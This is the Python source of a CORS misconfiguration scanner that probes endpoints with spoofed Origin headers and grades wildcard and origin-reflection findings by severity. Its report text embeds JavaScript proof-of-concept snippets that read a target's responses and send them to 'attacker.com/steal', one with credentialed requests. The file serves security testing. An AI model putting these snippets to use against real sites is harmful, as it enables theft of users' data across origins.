"""
CORS Misconfiguration Scanner — v2.1

Context-aware severity:
- Wildcard on sensitive endpoint → Medium
- Wildcard on public API → Info (downgraded)
- Arbitrary reflection with credentials → High
- Arbitrary reflection without credentials → Medium
"""

import tldextract
from rich.console import Console

from core.models import Vulnerability, Severity

console = Console()

TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://{target}",           # Target itself (credentialed check)
    "https://evil.{target}",      # Subdomain bypass attempt
    "https://{target}.evil.com",  # Suffix bypass
    "https://not{target}",        # Prefix bypass
]

# Sensitive path markers — wildcard on these is a real finding
SENSITIVE_PATH_MARKERS = (
    "/auth", "/user", "/users", "/account", "/profile",
    "/token", "/admin", "/me", "/session", "/login",
    "/settings", "/dashboard", "/payment", "/order",
)


class CORSScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _get_domain(self, url: str) -> str:
        ext = tldextract.extract(url)
        return f"{ext.domain}.{ext.suffix}"

    async def _test_origin(self, url: str, origin: str) -> dict | None:
        """Test CORS with a specific origin."""
        response = await self.http_client.get(
            url,
            headers={"Origin": origin},
        )
        if not response:
            return None

        acao = response.headers.get("access-control-allow-origin", "")
        acac = response.headers.get("access-control-allow-credentials", "")

        if not acao:
            return None

        return {
            "origin_sent": origin,
            "acao": acao,
            "acac": acac.lower() == "true",
        }

    @staticmethod
    def _is_sensitive_endpoint(url: str) -> bool:
        """Rule 4: Is this endpoint sensitive enough to warrant Medium+?"""
        url_lower = url.lower()
        return any(marker in url_lower for marker in SENSITIVE_PATH_MARKERS)

    async def scan(self, url: str) -> list[Vulnerability]:
        vulns: list[Vulnerability] = []
        domain = self._get_domain(url)
        console.print(f"  [dim]CORS scan: {url[:60]}[/dim]")

        # ══════════════════════════════════════════════════════════
        #  Wildcard check — Rule 4: context-aware severity
        # ══════════════════════════════════════════════════════════
        response = await self.http_client.get(url)
        if response:
            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")

            if acao == "*":
                is_sensitive = self._is_sensitive_endpoint(url)

                if is_sensitive:
                    severity = Severity.MEDIUM
                    cvss = 5.4
                    context = (
                        "Sensitive endpoint — cross-origin data theft possible."
                    )
                else:
                    severity = Severity.INFO
                    cvss = 0.0
                    context = (
                        "Public endpoint — impact limited. "
                        "Confirm whether any sensitive data is returned."
                    )

                vulns.append(Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=severity,
                    cvss_score=cvss,
                    title="CORS Wildcard Origin",
                    description=(
                        "Access-Control-Allow-Origin: * is set. " + context
                    ),
                    evidence="Access-Control-Allow-Origin: *",
                    exploitation=(
                        "If this endpoint returns sensitive data:\n"
                        "fetch('https://target.com/api/data')\n"
                        "  .then(r => r.json())\n"
                        "  .then(d => fetch('https://attacker.com/steal?d=' + "
                        "JSON.stringify(d)))"
                    ),
                    remediation=(
                        "Replace wildcard with an explicit origin allowlist:\n"
                        "Access-Control-Allow-Origin: https://yourdomain.com"
                    ),
                    curl_poc=f'curl -I -H "Origin: https://evil.com" "{url}" | grep -i access-control',
                    cwe_id="CWE-346",
                    references=[
                        "https://portswigger.net/web-security/cors",
                    ],
                ))

        # ══════════════════════════════════════════════════════════
        #  Origin reflection check
        # ══════════════════════════════════════════════════════════
        origins_to_test = [o.replace("{target}", domain) for o in TEST_ORIGINS]

        for origin in origins_to_test:
            # Skip the "self" origin (not a bug)
            if origin in ("https://" + domain, "https://www." + domain):
                continue

            result = await self._test_origin(url, origin)
            if not result:
                continue

            acao = result["acao"]
            has_credentials = result["acac"]

            # Real reflection?
            if acao == origin:
                # Rule 4: With credentials → HIGH, otherwise → MEDIUM
                # But if endpoint is not sensitive → downgrade to LOW
                is_sensitive = self._is_sensitive_endpoint(url)

                if has_credentials and is_sensitive:
                    severity = Severity.HIGH
                    cvss = 8.1
                elif has_credentials:
                    severity = Severity.MEDIUM
                    cvss = 6.5
                elif is_sensitive:
                    severity = Severity.MEDIUM
                    cvss = 5.4
                else:
                    severity = Severity.LOW
                    cvss = 3.7

                vuln = Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=severity,
                    cvss_score=cvss,
                    title=(
                        f"CORS Arbitrary Origin Reflection"
                        f"{' + Credentials' if has_credentials else ''}"
                    ),
                    description=(
                        f"Server reflects arbitrary Origin ({origin}) into "
                        f"Access-Control-Allow-Origin. "
                        f"{'With Allow-Credentials: true this enables full ' if has_credentials else ''}"
                        f"{'data theft across origins.' if has_credentials else 'This weakens same-origin policy.'}"
                    ),
                    evidence=(
                        f"Request Origin: {origin}\n"
                        f"Response ACAO: {acao}\n"
                        f"Allow-Credentials: {result['acac']}"
                    ),
                    exploitation=(
                        "Attacker page:\n\n"
                        "var req = new XMLHttpRequest();\n"
                        f"req.open('GET', '{url}', true);\n"
                        + ("req.withCredentials = true;\n" if has_credentials else "")
                        + "req.onload = function() {\n"
                        "  fetch('https://attacker.com/steal?d=' + "
                        "encodeURIComponent(this.responseText));\n"
                        "};\n"
                        "req.send();"
                    ),
                    remediation=(
                        "1. Create an origin allowlist — no dynamic reflection\n"
                        "2. Never combine wildcard/reflection with credentials\n"
                        "3. Add 'Vary: Origin' to prevent cache poisoning"
                    ),
                    curl_poc=(
                        f'curl -I -H "Origin: {origin}" "{url}" | '
                        f'grep -i "access-control"'
                    ),
                    cwe_id="CWE-346",
                    references=[
                        "https://portswigger.net/web-security/cors",
                    ],
                )
                vulns.append(vuln)
                console.print(
                    f"  {vuln.severity.emoji} [bold]CORS:[/bold] {origin} "
                    f"→ reflected"
                    f"{' + credentials' if has_credentials else ''}"
                )
                break    # One finding per URL is enough

        return vulns